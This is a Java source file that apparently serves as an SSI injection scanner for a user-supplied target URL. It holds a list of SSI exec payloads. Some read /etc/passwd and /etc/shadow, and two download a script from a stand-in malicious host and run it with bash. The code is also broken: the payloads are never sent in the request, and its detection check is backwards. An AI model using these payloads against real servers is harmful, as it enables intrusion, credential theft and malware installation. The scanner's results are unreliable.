import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SSITest {

    // ANSI color codes for console output
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";

    public static void main(String[] args) {
        // Prompt the user to enter the target website URL
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        System.out.println("Enter your target website URL: ");
        String urlToTest;
        try {
            urlToTest = reader.readLine();
            // Validate URL
            if (!isValidURL(urlToTest)) {
                System.out.println("Invalid URL. Please enter a valid URL.");
                return;
            }
        } catch (IOException e) {
            System.out.println("Error reading input. Exiting.");
            return;
        }

        // List of SSI Injection payloads to test
        List<String> ssiPayloads = new ArrayList<>();
        ssiPayloads.add("<!--#exec cmd=\"ls\" -->");
        ssiPayloads.add("<!--#exec cmd=\"dir\" -->");
        ssiPayloads.add("<!--#exec cmd=\"/bin/cat /etc/passwd\" -->");
        ssiPayloads.add("<!--#echo var=\"DATE_LOCAL\" -->");
        ssiPayloads.add("<!--#exec cmd=\"cat /etc/passwd\" -->");
        ssiPayloads.add("<!--#exec cmd=\"cat /etc/shadow\" -->");
        ssiPayloads.add("<!--#exec cmd=\"id\" -->");
        ssiPayloads.add("<!--#exec cmd=\"whoami\" -->");
        ssiPayloads.add("<!--#exec cmd=\"uname -a\" -->");
        ssiPayloads.add("<!--#exec cmd=\"ping -c 4 127.0.0.1\" -->");
        ssiPayloads.add("<!--#exec cmd=\"wget http://malicious-site.com/malware.sh -O /tmp/malware.sh\" -->");
        ssiPayloads.add("<!--#exec cmd=\"bash /tmp/malware.sh\" -->");
        // Add more payloads as needed

        // Perform testing using multithreading
        ExecutorService executor = Executors.newFixedThreadPool(5); // Adjust the number of threads as needed
        for (String payload : ssiPayloads) {
            executor.execute(() -> testForSSIInjection(urlToTest, payload));
        }
        executor.shutdown();
    }

    private static void testForSSIInjection(String urlToTest, String ssiPayload) {
        try {
            // Create URL object
            URL url = new URL(urlToTest);

            // Open connection
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Set request method
            connection.setRequestMethod("GET");

            // Get response code
            int responseCode = connection.getResponseCode();
            System.out.println("Response Code for " + ssiPayload + ": " + responseCode);

            // Read response
            StringBuilder response = new StringBuilder();
            BufferedReader in;
            if (responseCode == HttpURLConnection.HTTP_OK) {
                in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                // Print response content for successful payloads
                System.out.println("Response for " + ssiPayload + ":");
                System.out.println(response.toString());
            }

            // Analyze response for SSI Injection vulnerability
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(ssiPayload)) {
                System.out.println(ANSI_RED + "SSI Injection vulnerability found for payload: " + ssiPayload + ANSI_RESET);
            } else {
                System.out.println(ANSI_GREEN + "No SSI Injection vulnerability found for payload: " + ssiPayload + ANSI_RESET);
            }

        } catch (IOException e) {
            System.out.println("Error testing for SSI Injection vulnerability: " + e.getMessage());
        }
    }

    // Method to validate URL
    private static boolean isValidURL(String url) {
        try {
            new URL(url).toURI();
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
